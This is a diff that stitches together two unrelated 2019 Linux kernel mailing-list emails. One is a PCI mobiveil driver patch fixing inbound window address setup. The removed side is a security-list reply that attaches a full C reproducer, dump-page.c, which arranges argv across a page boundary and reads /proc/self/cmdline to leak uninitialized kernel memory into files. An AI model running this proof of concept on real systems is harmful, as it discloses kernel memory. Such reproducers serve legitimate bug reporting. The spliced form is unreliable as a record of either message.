@@ -2,157 +2,104 @@ Return-Path: <linux-kernel-owner@vger.kernel.org>
 X-Original-To: lists+linux-kernel@lfdr.de
 Delivered-To: lists+linux-kernel@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id 312AC67A61
-	for <lists+linux-kernel@lfdr.de>; Sat, 13 Jul 2019 16:09:47 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id A724267A6B
+	for <lists+linux-kernel@lfdr.de>; Sat, 13 Jul 2019 16:20:58 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1727780AbfGMOJa (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
-        Sat, 13 Jul 2019 10:09:30 -0400
-Received: from bran.ispras.ru ([83.149.199.196]:31577 "EHLO smtp.ispras.ru"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1727504AbfGMOJ3 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-        Sat, 13 Jul 2019 10:09:29 -0400
-Received: from [10.10.3.112] (starling.intra.ispras.ru [10.10.3.112])
-        by smtp.ispras.ru (Postfix) with ESMTP id 05CFE201D0;
-        Sat, 13 Jul 2019 17:09:28 +0300 (MSK)
-Subject: Re: [PATCH] proc: Fix uninitialized byte read in get_mm_cmdline()
-To:     Alexey Dobriyan <adobriyan@gmail.com>
-Cc:     Oleg Nesterov <oleg@redhat.com>, linux-kernel@vger.kernel.org,
-        linux-fsdevel@vger.kernel.org, security@kernel.org
-References: <20190712160913.17727-1-izbyshev@ispras.ru>
- <20190712163625.GF21989@redhat.com> <20190712174632.GA3175@avx2>
- <3de2d71b-37be-6238-7fd8-0a40c9b94a98@ispras.ru>
- <20190713072606.GA23167@avx2>
-From:   Alexey Izbyshev <izbyshev@ispras.ru>
-Message-ID: <2cba2f3d-4a7c-ddeb-fbd7-e2aafb728493@ispras.ru>
-Date:   Sat, 13 Jul 2019 17:09:27 +0300
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
- Thunderbird/60.7.1
-MIME-Version: 1.0
-In-Reply-To: <20190713072606.GA23167@avx2>
-Content-Type: multipart/mixed;
- boundary="------------C43CA79F4814729DBF8EE52C"
-Content-Language: en-US
+        id S1727911AbfGMOU4 (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
+        Sat, 13 Jul 2019 10:20:56 -0400
+Received: from inva020.nxp.com ([92.121.34.13]:39310 "EHLO inva020.nxp.com"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+        id S1727504AbfGMOU4 (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+        Sat, 13 Jul 2019 10:20:56 -0400
+Received: from inva020.nxp.com (localhost [127.0.0.1])
+        by inva020.eu-rdc02.nxp.com (Postfix) with ESMTP id 7BFC91A0048;
+        Sat, 13 Jul 2019 16:20:53 +0200 (CEST)
+Received: from invc005.ap-rdc01.nxp.com (invc005.ap-rdc01.nxp.com [165.114.16.14])
+        by inva020.eu-rdc02.nxp.com (Postfix) with ESMTP id 906351A002B;
+        Sat, 13 Jul 2019 16:20:49 +0200 (CEST)
+Received: from titan.ap.freescale.net (TITAN.ap.freescale.net [10.192.208.233])
+        by invc005.ap-rdc01.nxp.com (Postfix) with ESMTP id 74BC5402E3;
+        Sat, 13 Jul 2019 22:20:44 +0800 (SGT)
+From:   Hou Zhiqiang <Zhiqiang.Hou@nxp.com>
+To:     linux-pci@vger.kernel.org, linux-kernel@vger.kernel.org,
+        bhelgaas@google.com, l.subrahmanya@mobiveil.co.in,
+        leoyang.li@nxp.com, lorenzo.pieralisi@arm.com
+Cc:     Hou Zhiqiang <Zhiqiang.Hou@nxp.com>
+Subject: [PATCHv7] PCI: mobiveil: Fix the CPU base address setup in inbound window
+Date:   Sat, 13 Jul 2019 22:11:29 +0800
+Message-Id: <20190713141129.32249-1-Zhiqiang.Hou@nxp.com>
+X-Mailer: git-send-email 2.9.5
+X-Virus-Scanned: ClamAV using ClamSMTP
 Sender: linux-kernel-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-This is a multi-part message in MIME format.
---------------C43CA79F4814729DBF8EE52C
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
+The current code erroneously sets-up the CPU base address with
+parameter 'pci_addr', which is passed to initialize the PCI
+base address of the inbound window, and the upper 32-bit of the
+CPU base address of the inbound window is not initialized. This
+results in the current code only support 1:1 inbound window
+with limitation that the base address must be < 4GB.
 
-On 7/13/19 10:26 AM, Alexey Dobriyan wrote:
-> On Fri, Jul 12, 2019 at 09:43:03PM +0300, Alexey Izbyshev wrote:
->> On 7/12/19 8:46 PM, Alexey Dobriyan wrote:
->>> The proper fix to all /proc/*/cmdline problems is to revert
->>>
->>> 	f5b65348fd77839b50e79bc0a5e536832ea52d8d
->>> 	proc: fix missing final NUL in get_mm_cmdline() rewrite
->>>
->>> 	5ab8271899658042fabc5ae7e6a99066a210bc0e
->>> 	fs/proc: simplify and clarify get_mm_cmdline() function
->>>
->> Should this be interpreted as an actual suggestion to revert the patches,
->> fix the conflicts, test and submit them, or is this more like thinking out
->> loud?
-> 
-> Of course! Do you have a reproducer?
-> 
-Attached.
+This patch introduces a new parameter 'u64 cpu_addr' to initialize
+both lower 32-bit and upper 32-bit of the CPU base address to make
+it can support non 1:1 inbound window and fix the base address must
+be < 4GB limitation.
 
-Alexey
+Fixes: 9af6bcb11e12 ("PCI: mobiveil: Add Mobiveil PCIe Host Bridge IP driver")
+Signed-off-by: Hou Zhiqiang <Zhiqiang.Hou@nxp.com>
+Reviewed-by: Minghuan Lian <Minghuan.Lian@nxp.com>
+Reviewed-by: Subrahmanya Lingappa <l.subrahmanya@mobiveil.co.in>
+---
+V7:
+ - This patch is #25 of V6 patches, rewrote the changelog.
 
---------------C43CA79F4814729DBF8EE52C
-Content-Type: text/x-csrc;
- name="dump-page.c"
-Content-Transfer-Encoding: 7bit
-Content-Disposition: attachment;
- filename="dump-page.c"
+ drivers/pci/controller/pcie-mobiveil.c | 10 +++++++---
+ 1 file changed, 7 insertions(+), 3 deletions(-)
 
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/mman.h>
-#include <unistd.h>
+diff --git a/drivers/pci/controller/pcie-mobiveil.c b/drivers/pci/controller/pcie-mobiveil.c
+index 672e633..a45a644 100644
+--- a/drivers/pci/controller/pcie-mobiveil.c
++++ b/drivers/pci/controller/pcie-mobiveil.c
+@@ -88,6 +88,7 @@
+ #define  AMAP_CTRL_TYPE_MASK		3
+ 
+ #define PAB_EXT_PEX_AMAP_SIZEN(win)	PAB_EXT_REG_ADDR(0xbef0, win)
++#define PAB_EXT_PEX_AMAP_AXI_WIN(win)	PAB_EXT_REG_ADDR(0xb4a0, win)
+ #define PAB_PEX_AMAP_AXI_WIN(win)	PAB_REG_ADDR(0x4ba4, win)
+ #define PAB_PEX_AMAP_PEX_WIN_L(win)	PAB_REG_ADDR(0x4ba8, win)
+ #define PAB_PEX_AMAP_PEX_WIN_H(win)	PAB_REG_ADDR(0x4bac, win)
+@@ -462,7 +463,7 @@ static int mobiveil_pcie_parse_dt(struct mobiveil_pcie *pcie)
+ }
+ 
+ static void program_ib_windows(struct mobiveil_pcie *pcie, int win_num,
+-			       u64 pci_addr, u32 type, u64 size)
++			       u64 cpu_addr, u64 pci_addr, u32 type, u64 size)
+ {
+ 	u32 value;
+ 	u64 size64 = ~(size - 1);
+@@ -482,7 +483,10 @@ static void program_ib_windows(struct mobiveil_pcie *pcie, int win_num,
+ 	csr_writel(pcie, upper_32_bits(size64),
+ 		   PAB_EXT_PEX_AMAP_SIZEN(win_num));
+ 
+-	csr_writel(pcie, pci_addr, PAB_PEX_AMAP_AXI_WIN(win_num));
++	csr_writel(pcie, lower_32_bits(cpu_addr),
++		   PAB_PEX_AMAP_AXI_WIN(win_num));
++	csr_writel(pcie, upper_32_bits(cpu_addr),
++		   PAB_EXT_PEX_AMAP_AXI_WIN(win_num));
+ 
+ 	csr_writel(pcie, lower_32_bits(pci_addr),
+ 		   PAB_PEX_AMAP_PEX_WIN_L(win_num));
+@@ -624,7 +628,7 @@ static int mobiveil_host_init(struct mobiveil_pcie *pcie)
+ 			   CFG_WINDOW_TYPE, resource_size(pcie->ob_io_res));
+ 
+ 	/* memory inbound translation window */
+-	program_ib_windows(pcie, WIN_NUM_0, 0, MEM_WINDOW_TYPE, IB_WIN_SIZE);
++	program_ib_windows(pcie, WIN_NUM_0, 0, 0, MEM_WINDOW_TYPE, IB_WIN_SIZE);
+ 
+ 	/* Get the I/O and memory ranges from DT */
+ 	resource_list_for_each_entry(win, &pcie->resources) {
+-- 
+2.9.5
 
-#define PAGE_SIZE 4096
-
-#define CHECK(expr) \
-  ({ \
-    long r = (expr); \
-    if (r < 0) { \
-      perror(#expr); \
-      exit(1); \
-    } \
-    r; \
-  })
-
-static void dump(unsigned char *page, size_t ind) {
-    char fname[30];
-    sprintf(fname, "page%zu", ind);
-    printf("dumping %s\n", fname);
-    int fd = CHECK(open(fname, O_CREAT|O_TRUNC|O_WRONLY, 0666));
-    CHECK(write(fd, page, PAGE_SIZE));
-    close(fd);
-}
-
-int main(int argc, char *argv[], char *envp[]) {
-    char *last_arg_nul = argv[argc - 1] + strlen(argv[argc - 1]);
-    printf("last arg end: %p\n", last_arg_nul);
-    size_t argv_size = last_arg_nul - argv[0] + 1;
-    size_t page_offset = (uintptr_t)last_arg_nul & (PAGE_SIZE - 1);
-    if (page_offset != PAGE_SIZE - 1 || argv_size < PAGE_SIZE - 1) {
-        printf("will re-exec to arrange argv\n");
-        if (page_offset != PAGE_SIZE - 1) {
-            /* Pad env block so that the last byte of arg block is also
-             * the last byte of its page. */
-            size_t env0_size = page_offset + 1 + strlen(envp[0]) + 1;
-            char *new_env = malloc(env0_size);
-            memset(new_env, 'Z', env0_size - 1);
-            new_env[env0_size - 1] = '\0';
-            envp[0] = new_env;
-        }
-        char *path = argv[0];
-        if (argv_size < PAGE_SIZE) {
-          /* Also make sure that arg block is not shorter than a page. */
-          argv[0] = (char[]){[0 ... PAGE_SIZE - 1] = 'Z', '\0'};
-        }
-        execve(path, argv, envp);
-        perror("execve");
-        return 127;
-    }
-
-    *last_arg_nul = 'Z';
-    /* Make sure the kernel can't read past arg_end. */
-    CHECK(mprotect(last_arg_nul + 1, PAGE_SIZE, PROT_NONE));
-
-    char buf[PAGE_SIZE];
-    unsigned char leaked[PAGE_SIZE] = {'U'};
-    unsigned num_good = 0;
-    int fd = CHECK(open("/proc/self/cmdline", O_RDONLY));
-    while (1) {
-        int found_good = 0;
-        for (size_t off = 1; off < PAGE_SIZE; ++off) {
-            CHECK(lseek(fd, argv_size - off, SEEK_SET));
-            ssize_t got = CHECK(read(fd, buf, sizeof buf));
-            if (got <= off) {
-                printf("no leak: kernel seems to be fixed\n");
-                return 1;
-            }
-            unsigned char leaked_byte = buf[got - 1];
-            found_good |= (leaked_byte && leaked_byte != 'Z');
-            leaked[off] = leaked_byte;
-        }
-        if (found_good)
-            dump(leaked, num_good++);
-        sleep(1);
-    }
-
-    close(fd);
-    return 0;
-}
-
---------------C43CA79F4814729DBF8EE52C--
